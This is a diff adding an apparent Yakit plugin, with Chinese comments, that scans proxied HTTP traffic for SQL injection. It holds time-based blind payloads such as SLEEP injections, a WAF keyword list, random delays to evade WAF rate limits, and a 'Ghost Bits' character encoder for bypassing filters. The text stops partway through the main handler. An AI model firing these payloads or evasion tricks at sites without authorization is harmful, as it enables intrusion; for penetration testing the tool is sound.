@@ -1,0 +1,4049 @@
+/** 
+// 增强版SQL注入检测插件 - 
+// 1. 多payload关联分析（通过多个 payload 的连锁反应判断漏洞，例如单引号数量变化导致的响应相似度波动，提高检测准确性。）
+// 2. 条件组合验证（相似度+响应时间时间双重验证。支持“所有条件满足”或“任一条件满足”两种逻辑。）
+// 3. 分组差异化阈值（不同注入类型不同敏感度）
+// 4. 支持每个 payload 单独指定插入方式：append（追加到原始值后）或 replace（完全替换原始值），适用于不同场景（如参数值为空或需完全替换时）
+// 5. 多数据库错误特征库（内置丰富的 SQL 错误关键词，覆盖 MySQL、PostgreSQL、MSSQL、Oracle、SQLite 等主流数据库，可识别报错注入并提示数据库类型。）
+// 6. 识别 WAF 拦截页面（内置 100+ WAF 特征），发现 WAF 后自动跳过该 payload，减少无效请求。
+// 7.支持检测 Referer、X-Forwarded-For 等常见 HTTP 头中的 SQL 注入，并采用时间盲注双重验证。
+//
+//
+//
+// 修改：支持 payload 级别指定插入模式 (append/replace)
+// 2025-03-04 更新：时间盲注组改为“任一条件满足”判定逻辑
+// 2025-03-04 修复：添加 conditionResults 定义，消除静态警告
+// FIX: 修复漏洞报告时使用错误 payload 的问题（2026-03-04）
+*/
+
+
+
+
+
+
+//有什么插件问题或者好的修改意见微信联系我——————Th1n_Ker
+
+
+
+
+/**
+// 检测组配置示例(同时是payload文件格式)
+[
+    {
+        "name": "MySQL时间盲注验证",           // 组名称
+        "type": "time",                        // 类型: time/error/boolean/union
+        "logic": "any",                        // 判定逻辑: all(全满足)/any(任一满足)
+        "payloads": [                          // payload列表
+            "' AND SLEEP(5)--",                 // 字符串=追加模式
+            {                                    // 对象可指定模式
+                "value": "id,(SELECT 1 FROM (SELECT(SLEEP(5)))a)",
+                "mode": "replace"                // append(追加)/replace(替换)
+            }
+        ],
+        "conditions": [                          // 判定条件
+            {
+                "payload": "' AND SLEEP(5)--",   // 关联的payload
+                "compareWith": "original",        // 对比基准: original/其他payload
+                "baseThreshold": 0.1,             // 相似度阈值
+                "thresholdOperator": ">",          // 比较符: >/<
+                "timeThreshold": 4000,              // 时间阈值(ms)
+                "timeThresholdOperator": ">"        // 时间比较符
+            }
+        ],
+        "description": "MySQL时间盲注检测"       // 描述
+    }
+]
+**/
+
+
+
+// === CLI 参数定义 ===
+// === 新增：自定义 payload 文件 ===
+customPayloadFile = cli.File("payload-file", 
+    cli.setHelp("从本地文件加载自定义 payload (JSON 格式，应包含与内置组相同结构的数组）"), 
+    cli.setVerboseName("自定义 payload 文件"), 
+        cli.setCliGroup("额外字典扩充"),
+    cli.setRequired(false))
+
+yakitPayload = cli.String("yakit-payload", 
+    cli.setYakitPayload(true), 
+    cli.setHelp("选择 Yakit Payload 列表。若内容为完整检测组 JSON 对象则直接使用，否则作为普通 payload 列表自动生成检测组"), 
+    cli.setVerboseName("Yakit Payload"), 
+    cli.setCliGroup("额外字典扩充"),
+    cli.setRequired(false))
+
+// === 临时 payload 测试（直接输入 payload 字符串，支持 append 和 replace 两种模式）===
+tempPayloads = cli.Text("temp-payloads", 
+    cli.setHelp("临时测试一个或多个 payload，使用逗号分隔。每个 payload 将分别以 append 和 replace 两种模式测试，任一模式触发相似度<0.5 或响应时间>4000ms 即告警"), 
+    cli.setVerboseName("临时Payload"), 
+    cli.setCliGroup("额外字典扩充"), 
+    cli.setRequired(false))
+
+onlyExtraDict = cli.Bool("only-extra-dict", 
+    cli.setDefault(false), 
+    cli.setHelp("仅测试额外字典扩充参数组（自定义payload文件、Yakit Payload、临时Payload），忽略内置检测组"), 
+    cli.setVerboseName("仅测试额外字典"), 
+    cli.setCliGroup("额外字典扩充"), 
+    cli.setRequired(false))
+
+
+blacklistDomainsStr = cli.String("blacklist", 
+    cli.setDefault(""), 
+    cli.setHelp("设置域名黑名单，逗号分隔；匹配主域及其子域"), 
+    cli.setVerboseName("域名黑名单"), 
+    cli.setRequired(false))
+
+paramBlacklistStr = cli.String("param-blacklist", 
+    cli.setDefault("csrf_token,session_id,signature,captcha"), 
+    cli.setHelp("参数名黑名单，这些参数不检测SQL注入"), 
+    cli.setVerboseName("参数名黑名单"), 
+    cli.setRequired(false))
+
+urlSuffixBlacklistStr = cli.String("url-suffix-blacklist", 
+    cli.setDefault(".png,.jpg,.jpeg,.gif,.css,.js,.ico,.svg,.woff,.woff2,.ttf,.eot,.pdf,.zip,.rar,.exe,.mp3,.mp4,.avi,.flv,.mkv"), 
+    cli.setHelp("URL后缀黑名单，排除静态资源"), 
+    cli.setVerboseName("URL后缀黑名单"), 
+    cli.setRequired(false))
+
+pathBlacklistStr = cli.String("path-blacklist", 
+    cli.setDefault("/static,/assets,/images,/css,/js,/favicon.ico,/robots.txt,/sitemap.xml"), 
+    cli.setHelp("路径黑名单，排除特定路径"), 
+    cli.setVerboseName("路径黑名单"), 
+    cli.setRequired(false))
+
+paramValueBlacklistStr = cli.String("param-value-blacklist", 
+    cli.setDefault("true,false,yes,no,on,off,null,undefined,nil"), 
+    cli.setHelp("参数值黑名单，排除常见布尔/标志值"), 
+    cli.setVerboseName("参数值黑名单"), 
+    cli.setRequired(false))
+
+minParamValueLength = cli.Int("min-param-value-length", 
+    cli.setDefault(0), 
+    cli.setHelp("最小参数值长度，低于此值不检测"), 
+    cli.setVerboseName("最小参数值长度"), 
+    cli.setRequired(false))
+
+maxConcurrent = cli.Int("max-concurrent", 
+    cli.setDefault(3), 
+    cli.setHelp("最大并发请求数"), 
+    cli.setVerboseName("最大并发数"), 
+    cli.setRequired(false))
+
+// 随机延迟范围（毫秒），用于避免 WAF 速率限制
+randomDelayMin = cli.Int("random-delay-min", 
+    cli.setDefault(0), 
+    cli.setHelp("随机延迟最小值（毫秒），0 表示不延迟"), 
+    cli.setVerboseName("随机延迟最小值"), 
+    cli.setRequired(false))
+
+randomDelayMax = cli.Int("random-delay-max", 
+    cli.setDefault(0), 
+    cli.setHelp("随机延迟最大值（毫秒），必须大于等于最小值"), 
+    cli.setVerboseName("随机延迟最大值"), 
+    cli.setRequired(false))
+
+// HTTP 超时（秒）
+httpTimeout = cli.Int("http-timeout", 
+    cli.setDefault(10), 
+    cli.setHelp("HTTP 请求超时时间（秒）"), 
+    cli.setVerboseName("HTTP超时"), 
+    cli.setRequired(false))
+
+// 失败重试次数
+maxRetries = cli.Int("max-retries", 
+    cli.setDefault(1), 
+    cli.setHelp("请求失败时的最大重试次数（0 表示不重试）"), 
+    cli.setVerboseName("最大重试次数"), 
+    cli.setRequired(false))
+
+similarityThresholdFactor = cli.Float("similarity-threshold-factor", 
+    cli.setDefault(1.0), 
+    cli.setHelp("相似度阈值调整系数（0.5~2.0）数值越低检测越宽松"), 
+    cli.setVerboseName("相似度阈值调整系数"), 
+    cli.setRequired(false))
+
+// enableHeaderInjection = cli.Bool("enable-header-injection", 
+//     cli.setDefault(false), 
+//     cli.setHelp("是否检测Header注入（Referer/X-Forwarded-For）"), 
+//     cli.setVerboseName("启用Header注入检测"), 
+//     cli.setRequired(false))
+
+// enableUnionDetection = cli.Bool("enable-union-detection", 
+//     cli.setDefault(false), 
+//     cli.setHelp("是否检测UNION注入"), 
+//     cli.setVerboseName("启用UNION注入检测"), 
+//     cli.setRequired(false))
+
+proxy1 = cli.String("proxy", 
+    cli.setHelp("http://xxx:xx"), 
+    cli.setVerboseName("代理"), 
+    cli.setRequired(false))
+
+// === 新增功能1：默认黑名单 ===
+// defaultBlack = cli.Bool("defaultBlack", 
+//     cli.setDefault(true), 
+//     cli.setHelp("勾选后会把一些公共服务、开发平台、云厂商、常见静态资源CDN都屏蔽掉"), 
+//     cli.setVerboseName("默认黑名单"), 
+//     cli.setRequired(false))
+
+notTestCookie = cli.Bool("notTestCookie", 
+    cli.setDefault(true), 
+    cli.setHelp("勾选后将不再测试Cookie里的参数"), 
+    cli.setVerboseName("不测试Cookie"), 
+    cli.setRequired(false))
+
+// === 新增功能2：Host白名单 ===
+whiteHosts = cli.Text("whiteHosts", 
+    cli.setHelp("按行分隔，只有在此白名单内的Host才会被扫描（为空则扫描所有）"), 
+    cli.setVerboseName("Host白名单"), 
+    cli.setRequired(false))
+
+
+// === WAF 拦截处理 ===
+stopOnWaf = cli.Bool("stop-on-waf", 
+    cli.setDefault(false), 
+    cli.setHelp("检测到 WAF 拦截后是否立即停止该参数的所有后续检测组（默认 false，仅跳过当前检测组）"), 
+    cli.setVerboseName("WAF后停止"), 
+    cli.setRequired(false))
+    
+swapInsertMode = cli.Bool("swap-insert-mode", 
+    cli.setDefault(false), 
+    cli.setHelp("开启后，每个检测组会额外以互换插入模式（append↔replace）再测试一遍，扩大检测覆盖面"), 
+    cli.setVerboseName("交换插入模式"), 
+    cli.setRequired(false))
+
+enableGhostBits = cli.Bool("enable-ghost-bits",
+    cli.setDefault(false),
+    cli.setHelp("开启后自动为每个检测组生成 Ghost Bits 汉字载荷，探测 char→byte 截断型注入"),
+    cli.setVerboseName("启用 Ghost Bits 模式"),
+    cli.setRequired(false))
+
+cli.check()
+
+// 临时定义，避免静态检测报错
+enableUnionDetection = false
+enableHeaderInjection = false
+
+yakit.AutoInitYakit()
+
+// === 默认黑名单内容 ===
+defaultBlacklistContent = `baidu.com
+google.com
+qq.com
+taobao.com
+aliyun.com
+tencent.com
+163.com
+126.com
+sina.com
+sohu.com
+doubao.com
+360.com
+bing.com
+yandex.com
+yahoo.com
+duckduckgo.com
+ask.com
+`
+
+// === 辅助函数定义（必须在主函数之前）===
+
+// === 根据关键词识别数据库类型 ===
+detectDatabaseType = func(keyword) {
+    keywordLower = str.ToLower(keyword)
+    
+    if str.Contains(keywordLower, "mysql") || str.Contains(keywordLower, "sqlstate[") {
+        return "MySQL"
+    } else if str.Contains(keywordLower, "postgresql") || str.Contains(keywordLower, "pg_") {
+        return "PostgreSQL"
+    } else if str.Contains(keywordLower, "microsoft sql") || str.Contains(keywordLower, "msg 102") {
+        return "MSSQL"
+    } else if str.Contains(keywordLower, "ora-") {
+        return "Oracle"
+    } else if str.Contains(keywordLower, "sqlite") {
+        return "SQLite"
+    } else if str.Contains(keywordLower, "access") || str.Contains(keywordLower, "odbc") {
+        return "Access/ODBC"
+    }
+    
+    return "Unknown"
+}
+
+// === 根据payload识别数据库类型 ===
+detectDatabaseTypeFromPayloads = func(payloads) {
+    for _, payload = range payloads {
+        if payload == nil {
+            continue
+        }
+        // 兼容对象payload，提取value
+        payloadStr = ""
+        if type(payload) == "string" {
+            payloadStr = payload
+        } else {
+            payloadStr = payload["value"]
+        }
+        payloadLower = str.ToLower(payloadStr)
+        
+        if str.Contains(payloadLower, "sleep") {
+            return "MySQL"
+        } else if str.Contains(payloadLower, "pg_sleep") {
+            return "PostgreSQL"
+        } else if str.Contains(payloadLower, "waitfor delay") {
+            return "MSSQL"
+        } else if str.Contains(payloadLower, "dbms_pipe") {
+            return "Oracle"
+        }
+    }
+    
+    return "Unknown"
+}
+
+
+// === 创建带代理的 fuzzer（统一封装）===
+createFuzzerWithProxy = func(req, isHttps, proxy) {
+    opts = [fuzz.https(isHttps)]
+    if proxy != nil && proxy != "" {
+        opts = append(opts, fuzz.proxy(proxy))
+    }
+    // 显式返回两个值：fuzzer 和 error
+    fuzzer, err = fuzz.HTTPRequest(req, opts...)
+    return fuzzer, err
+}
+
+// === 提取 payload 信息：返回 (value, mode) ===
+extractPayloadInfo = func(item) {
+    // 首先检查 item 是否为 nil，避免后续访问 panic
+    if item == nil {
+        return "", "append"
+    }
+
+    switch type(item) {
+    case "string":
+        // 字符串直接作为 value，mode 默认为 append
+        return item, "append"
+    case "map":
+        // 显式赋值给临时变量，帮助静态分析器识别类型
+        m = item
+        value = m["value"]
+        if value == nil {
+            value = ""
+        }
+        mode = m["mode"]
+        if mode == nil {
+            mode = "append"
+        }
+        return value, mode
+    default:
+        // 其他类型（数字、布尔等）作为 fallback
+        return "", "append"
+    }
+}
+
+// === 优化版 WAF 拦截页面特征库（不区分大小写，避免与 SQL 报错重叠）===
+wafKeywords = [
+    // ---------- 主流 WAF 产品标识（几乎不会出现在数据库错误中）----------
+    "Web Application Firewall",
+    "WAF",
+    "ModSecurity",
+    "Cloudflare",
+    "CloudFlare",
+    "AWS WAF",
+    "Amazon WAF",
+    "Azure WAF",
+    "Google Cloud Armor",
+    "Akamai",
+    "Incapsula",
+    "Imperva",
+    "F5 Networks",
+    "F5 BIG-IP",
+    "Barracuda",
+    "Sucuri",
+    "SiteLock",
+    "StackPath",
+    "Radware",
+    "Fortinet",
+    "Palo Alto",
+    "安全狗",
+    "Safedog",
+    "云盾",
+    "Yundun",
+    "阿里云盾",
+    "阿里云 WAF",
+    "腾讯云 WAF",
+    "百度云 WAF",
+    "华为云 WAF",
+    "360网站卫士",
+    "360waf",
+    "创宇盾",
+    "知道创宇",
+    "玄武盾",
+    "安恒云锁",
+    "安恒明御",
+    "深信服",
+    "绿盟",
+    "启明星辰",
+    "天融信",
+
+    // ---------- WAF 拦截页面特有短语（避免与 SQL 错误重叠）----------
+    // 英文常见拦截提示
+    "Your request has been blocked",
+    "The requested URL was rejected",
+    "This request was blocked by",
+    "has been blocked by security policy",
+    "violation of security policy",
+    "Security policy violation",
+    "Request blocked by WAF",
+    "Request rejected by security rules",
+    "Malicious request detected and blocked",
+    "Attack detected and blocked",
+    "Suspicious activity detected",
+    "Invalid input was blocked",
+    "Cross-site scripting attempt blocked",
+    "SQL injection attempt blocked",
+    "Blocked due to security rules",
+
+    // 中文常见拦截提示
+    "您的请求已被拦截",
+    "请求被拒绝",
+    "拒绝访问",
+    "访问被拒绝",
+    "非法请求已被拦截",
+    "恶意请求已被阻止",
+    "检测到攻击行为",
+    "攻击已被拦截",
+    "触发安全规则",
+    "被安全策略阻止",
+    "请求违反安全策略",
+    "可疑请求已被拦截",
+    "参数包含非法字符已被拦截",
+    "SQL注入尝试已被拦截",
+    "跨站脚本攻击已被拦截",
+
+    // ---------- 部分通用但需结合上下文的关键词（保留，因 WAF 页面常出现）----------
+    // 这些词单独出现可能被数据库错误误报，但在实际 WAF 页面中通常伴随其他特征，
+    // 为降低误报，建议在检测时考虑页面整体内容（此处仅作特征库，具体检测时可加逻辑判断）
+    "Blocked",
+    "Rejected",
+    "Forbidden",
+    "Malicious",
+    "Attack",
+    "Suspicious",
+    "Security",
+    "Intercept"
+]
+
+// === 检测响应是否为 WAF 拦截页面 ===
+isWAFResponse = func(rawBody) {
+    if rawBody == nil || rawBody == "" {
+        return false
+    }
+    // 仅对响应体做一次小写转换
+    lowerBody := str.ToLower(rawBody)
+    // 直接使用启动时预计算的小写关键词切片
+    for _, lowerKw := range lowerWafKeywords {
+        if str.Contains(lowerBody, lowerKw) {
+            println(sprintf("WAF 特征命中: %s", lowerKw))
+            return true
+        }
+    }
+    return false
+}
+
+
+
+
+// ========== 全局预编译正则 & WAF 预处理（性能优化） ==========
+
+// 1. 逐个预编译动态内容清洗正则
+cleanPat0, _ := re.Compile(`\b\d{10}\b`)
+cleanPat1, _ := re.Compile(`\b\d{13}\b`)
+cleanPat2, _ := re.Compile(`\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?(Z|[+-]\d{2}:\d{2})?`)
+cleanPat3, _ := re.Compile(`[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)
+cleanPat4, _ := re.Compile(`nonce="[^"]*"`)
+cleanPat5, _ := re.Compile(`name="_csrf_token" value="[^"]*"`)
+cleanPat6, _ := re.Compile(`\b[a-zA-Z0-9_]{16,}\b`)
+cleanPat7, _ := re.Compile(`\b[0-9a-fA-F]{32,}\b`)
+cleanPat8, _ := re.Compile(`第\s*\d+\s*页[，,]\s*共\s*\d+\s*页`)          // 中文分页
+cleanPat9, _ := re.Compile(`\d+条记录|共\d+条`)                         // 记录数
+
+
+// 组装成切片（注意顺序要和占位符严格对齐）
+compiledCleanPatterns := [cleanPat0, cleanPat1, cleanPat2, cleanPat3, cleanPat4, cleanPat5, cleanPat6, cleanPat7, cleanPat8, cleanPat9]
+cleanPlaceholders := [
+    "<TIMESTAMP>",
+    "<TIMESTAMP_MS>",
+    "<ISO_DATE>",
+    "<UUID>",
+    `nonce="<NONCE>"`,
+    `name="_csrf_token" value="<CSRF>"`,
+    "<RAND_STR>",
+    "<HEX32>",
+    "<PAGINATION>",
+    "<RECORD_COUNT>", 
+]
+
+// 2. WAF 关键字全部一次性转小写
+//    （原 wafKeywords 数组不动，这里只是它的只读小写缓存）
+lowerWafKeywords := make([]string, len(wafKeywords))
+for i, kw := range wafKeywords {
+    lowerWafKeywords[i] = str.ToLower(kw)
+}
+
+
+
+// === 动态内容清洗：正则替换动态值 ===
+cleanDynamicContent = func(rawBody) {
+    if rawBody == nil || rawBody == "" {
+        return rawBody
+    }
+    cleaned := rawBody
+    // 直接使用启动时预编译的全局正则，无运行时编译开销
+    for i, compiledRe := range compiledCleanPatterns {
+        cleaned = compiledRe.ReplaceAllString(cleaned, cleanPlaceholders[i])
+    }
+    return cleaned
+}
+
+
+
+
+// === 工具函数：解析黑名单为 map ===
+parseDomainListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, ",")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        d = str.TrimSpace(itemStr)
+        if d == "" {
+            continue
+        }
+        d = str.ToLower(d)
+        if str.HasPrefix(d, ".") {
+            d = str.TrimPrefix(d, ".")
+        }
+        if str.HasSuffix(d, ".") {
+            d = str.TrimSuffix(d, ".")
+        }
+        if d != "" {
+            m[d] = true
+        }
+    }
+    return m
+}
+
+parseParamListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, ",")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        paramName = str.TrimSpace(itemStr)
+        if paramName == "" {
+            continue
+        }
+        paramName = str.ToLower(paramName)
+        if paramName != "" {
+            m[paramName] = true
+        }
+    }
+    return m
+}
+
+parseUrlSuffixListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, ",")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        suffix = str.TrimSpace(itemStr)
+        if suffix == "" {
+            continue
+        }
+        suffix = str.ToLower(suffix)
+        if suffix != "" {
+            m[suffix] = true
+        }
+    }
+    return m
+}
+
+parsePathListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, ",")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        path = str.TrimSpace(itemStr)
+        if path == "" {
+            continue
+        }
+        path = str.ToLower(path)
+        if path != "" {
+            m[path] = true
+        }
+    }
+    return m
+}
+
+parseParamValueListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, ",")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        value = str.TrimSpace(itemStr)
+        if value == "" {
+            continue
+        }
+        value = str.ToLower(value)
+        if value != "" {
+            m[value] = true
+        }
+    }
+    return m
+}
+
+// === 新增：白名单解析函数 ===
+parseWhiteListToMap = func(listStr) {
+    m = make(map[string]bool)
+    if listStr == nil || listStr == "" { 
+        return m 
+    }
+    items = str.Split(listStr, "\n")
+    for i = 0; i < len(items); i++ {
+        item = items[i]
+        if item == nil {
+            continue
+        }
+        itemStr = sprintf("%v", item)
+        if itemStr == "" {
+            continue
+        }
+        d = str.TrimSpace(itemStr)
+        if d == "" {
+            continue
+        }
+        if str.HasPrefix(d, "*") {
+            d = str.TrimPrefix(d, "*")
+        }
+        d = str.ToLower(d)
+        if d != "" {
+            m[d] = true
+        }
+    }
+    return m
+}
+
+// === 新增：通配符匹配函数 ===
+matchGlobPattern = func(host, pattern) {
+    if str.HasSuffix(host, pattern) {
+        return true
+    }
+    if host == pattern {
+        return true
+    }
+    return false
+}
+
+// === 初始化黑名单映射 ===
+domainBlacklistMap = parseDomainListToMap(blacklistDomainsStr)
+
+// if defaultBlack {
+defaultDomains = str.Split(defaultBlacklistContent, "\n")
+for i = 0; i < len(defaultDomains); i++ {
+    item = defaultDomains[i]
+    if item == nil {
+        continue
+    }
+    itemStr = sprintf("%v", item)
+    if itemStr == "" {
+        continue
+    }
+    d = str.TrimSpace(itemStr)
+    if d == "" {
+        continue
+    }
+    if str.HasPrefix(d, "*") {
+        d = str.TrimPrefix(d, "*")
+    }
+    d = str.ToLower(d)
+    if d != "" {
+        domainBlacklistMap[d] = true
+    }
+}
+println(sprintf("已启用默认黑名单，共添加默认域名规则: %d", len(domainBlacklistMap)))
+// }
+
+paramBlacklistMap = parseParamListToMap(paramBlacklistStr)
+urlSuffixBlacklistMap = parseUrlSuffixListToMap(urlSuffixBlacklistStr)
+pathBlacklistMap = parsePathListToMap(pathBlacklistStr)
+paramValueBlacklistMap = parseParamValueListToMap(paramValueBlacklistStr)
+
+
+// === 获取字符串子串的辅助函数 ===
+substring = func(s, start, end) {
+    if s == nil || start < 0 || end > len(s) || start >= end {
+        return ""
+    }
+    result = ""
+    for i = start; i < end; i++ {
+        result = result + string(s[i])
+    }
+    return result
+}
+
+if proxy1 != "" {
+    println(sprintf("🔍 测试代理 %s 是否可用...", proxy1))
+    // 构造一个完整的 HTTP GET 请求报文
+    testRawReq = "GET /ip HTTP/1.1\r\nHost: httpbin.org\r\nConnection: close\r\n\r\n"
+    rspBody, _, err := poc.HTTP(testRawReq, poc.proxy(proxy1), poc.timeout(10))
+    if err != nil {
+        println(sprintf("❌ 代理测试请求失败: %v", err))
+    } else {
+        println(sprintf("✅ 代理测试成功，响应内容: %s", string(rspBody)))
+    }
+}
+
+
+
+
+// === Ghost Bits 映射表（ASCII → 汉字）===
+ghostMap = make(map[string]string)
+
+chineseHighBytes = [0x4E, 0x5B, 0x6C, 0x7A, 0x80, 0x85, 0x90, 0x95]
+for b = 0x20; b <= 0x7E; b++ {
+    high = chineseHighBytes[randn(0, len(chineseHighBytes))]
+    ghostMap[sprintf("%d", b)] = chr(high*256 + b)
+}
+
+// 若需启用随机高位，将下面一行改为 true
+// randomGhostBits = true
+// if randomGhostBits {
+//     chineseHighBytes = [0x4E, 0x5B, 0x6C, 0x7A, 0x80, 0x85, 0x90, 0x95]
+//     for b = 0x20; b <= 0x7E; b++ {
+//         high = chineseHighBytes[randn(0, len(chineseHighBytes))]
+//         ghostMap[sprintf("%d", b)] = chr(high*256 + b)
+//     }
+// } else {
+//     for b = 0x20; b <= 0x7E; b++ {
+//         ghostMap[sprintf("%d", b)] = chr(0x4E00 + b)
+//     }
+// }
+
+// === Ghost Bits 转换函数 ===
+toGhostBits = func(s) {
+    result = ""
+    for i = 0; i < len(s); i++ {
+        b = s[i]                    // 字节值 (0~255)
+        if b >= 0x20 && b <= 0x7E { // 可打印 ASCII
+            key = sprintf("%d", b)
+            ghostChar = ghostMap[key]
+            if ghostChar != "" {
+                result = result + ghostChar
+            } else {
+                result = result + string(b)
+            }
+        } else {
+            // 非可打印 ASCII 或高位字节，原样保留
+            result = result + string(b)
+        }
+    }
+    return result
+}
+
+
+
+
+
+
+// === 主处理函数 ===
+mirrorFilteredHTTPFlow = func(isHttps, url, req, rsp, body) {
+    rspIns23, err = poc.ParseBytesToHTTPResponse(rsp)
+    if err != nil {
+        println(sprintf("解析HTTP响应失败: %v", err))
+        return
+    }
+    
+    codes = [404, 502, 301, 302, 403]
+    if rspIns23.StatusCode in codes {
+        println(sprintf("状态码判定跳过: %d", rspIns23.StatusCode))
+        return
+    }
+    
+    lowerUrl = str.ToLower(url)
+    for suffix, _ = range urlSuffixBlacklistMap {
+        if str.HasSuffix(lowerUrl, suffix) {
+            println(sprintf("URL后缀黑名单命中，跳过: %s (后缀: %s)", url, suffix))
+            return
+        }
+    }
+    
+    reqPath = poc.GetHTTPRequestPath(req)
+    lowerPath = str.ToLower(reqPath)
+    for path, _ = range pathBlacklistMap {
+        if lowerPath == path || str.HasPrefix(lowerPath, path + "/") {
+            println(sprintf("路径黑名单命中，跳过: %s (路径: %s)", reqPath, path))
+            return
+        }
+    }
+    
+    freq, err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
+    if err != nil {
+        println(sprintf("创建fuzz请求失败: %v", err))
+        return
+    }
+    
+    host, port, _ = str.ParseStringToHostPort(url)
+    addr = str.HostPort(host, port)
+
+    if whiteHosts != nil && whiteHosts != "" {
+        whiteHostsMap = parseWhiteListToMap(whiteHosts)
+        if len(whiteHostsMap) > 0 {
+            hostLower = str.ToLower(host)
+            isInWhiteList = false
+            
+            for pattern, _ = range whiteHostsMap {
+                if matchGlobPattern(hostLower, pattern) {
+                    isInWhiteList = true
+                    break
+                }
+            }
+            
+            if !isInWhiteList {
+                println(sprintf("主机不在白名单内，跳过扫描: %s", host))
+                return
+            }
+            println(sprintf("主机在白名单内，继续扫描: %s", host))
+        }
+    }
+
+    hostLower = str.ToLower(host)
+    for domain, _ = range domainBlacklistMap {
+        if hostLower == domain || str.HasSuffix(hostLower, "." + domain) {
+            println(sprintf("黑名单命中域名，跳过: %s", host))
+            return
+        }
+    }
+
+    getpa = freq.GetCommonParams()
+    getpa = string(getpa)
+    
+    // === 请求去重机制 ===
+    // reqPath = poc.GetHTTPRequestPath(req)
+    // paths = reqPath + addr + getpa
+    // println(paths)
+    // paths = codec.Md5(paths)
+    
+    // if db.GetProjectKey(paths) == "123" {
+    //     println("重复扫描，已跳过")
+    //     return
+    // } else {
+    //     db.SetProjectKey(paths, "123")
+    // }
+
+    // === 发送原始请求获取基准响应 ===
+    // 随机延迟（如果启用）
+    if randomDelayMax > 0 {
+        delay := randn(randomDelayMin, randomDelayMax)
+        // 直接转换为秒（浮点数），Yakit 的 time.Sleep 能够识别
+        time.Sleep(float64(delay) / 1000.0) 
+    }
+
+    executeWithRetry = func(fuzzer, timeout) {
+        var lastErr           // 不指定类型，保持原始风格
+        for attempt := 0; attempt <= maxRetries; attempt++ {   // 使用 := 声明局部变量
+            if (attempt > 0) {
+                waitMs := 1000
+                // 确保 randn 的参数合法：1500 必须大于 500
+                if (randomDelayMax > 0) {
+                    waitMs = randn(500, 1500) 
+                }
+                // 使用 float64 进行转换，确保精度并避免直接传递 duration 对象可能的兼容问题
+                time.Sleep(float64(waitMs) / 1000.0)
+            }
+            resp, err := fuzzer.ExecFirst(fuzz.WithTimeOut(timeout))
+            if err == nil {
+                return resp, err
+            }
+            lastErr = err
+        }
+        return nil, lastErr
+    }
+
+
+    // 使用 fuzz 发送原始请求，支持超时和重试
+    // fuzzer, err = fuzz.HTTPRequest(req, fuzz.https(isHttps))
+    // fuzzer, err = fuzz.HTTPRequest(req, 
+    // fuzz.https(isHttps),
+    // fuzz.proxy(proxy1)
+    // )
+    fuzzer, err = createFuzzerWithProxy(req, isHttps, proxy1)
+    if err != nil {
+        println(sprintf("创建原始请求的 fuzzer 失败: %v", err))
+        return
+    }
+
+    // === 发送三次原始请求：计算基线相似度 + 时间基线 ===
+    // 使用短声明，不显式指定类型
+    originalBody = ""
+    cleanedOriginalBody = ""
+    baselineSimilarity = 1.0
+    baselineAvgTime = 0.0
+    baselineStdTime = 0.0
+    timeSamples = make([]int, 0, 3)   // 用于滑动窗口初始化和时间基线
+
+    body1 = ""
+    body2 = ""
+    for attempt := 0; attempt < 3; attempt++ {
+        if attempt > 0 {
+            time.Sleep(0.1)   // 短暂间隔避免缓存
+        }
+        resp, err := executeWithRetry(fuzzer, httpTimeout)
+        if err != nil {
+            println(sprintf("原始请求第%d次失败: %v", attempt+1, err))
+            continue
+        }
+        b := string(resp.LowhttpResponse.GetBody())
+        t := resp.ServerDurationMs
+        timeSamples = append(timeSamples, t)
+
+        cleaned := cleanDynamicContent(b)
+        if attempt == 0 {
+            originalBody = b
+            cleanedOriginalBody = cleaned
+            body1 = b
+        } else if attempt == 1 {
+            body2 = b
+            baselineSimilarity, _ = str.CalcTextMaxSubStrStability(cleanedOriginalBody, cleaned)
+        }
+        // 取最长的响应体作为最终基准
+        if len(b) > len(originalBody) {
+            originalBody = b
+            cleanedOriginalBody = cleaned
+        }
+    }
+
+    // 处理时间基线统计
+    if len(timeSamples) >= 2 {
+        sum = 0
+        for _, t = range timeSamples {
+            sum += t
+        }
+        baselineAvgTime = float64(sum) / float64(len(timeSamples))
+        sumSq = 0.0
+        for _, t = range timeSamples {
+            diffVal := float64(t) - baselineAvgTime
+            sumSq += diffVal * diffVal
+        }
+        baselineStdTime = math.Sqrt(sumSq / float64(len(timeSamples)))
+    } else if len(timeSamples) == 1 {
+        baselineAvgTime = float64(timeSamples[0])
+        baselineStdTime = 0.0
+    } else {
+        // 完全失败时的降级默认值
+        baselineAvgTime = 200.0
+        baselineStdTime = 50.0
+    }
+
+    if baselineSimilarity < 0.5 {
+        baselineSimilarity = 1.0   // 极端不稳定时保守回归
+    }
+    println(sprintf("页面基线相似度: %.4f", baselineSimilarity))
+    println(sprintf("时间基线: avg=%.1fms, std=%.1fms", baselineAvgTime, baselineStdTime))
+
+
+
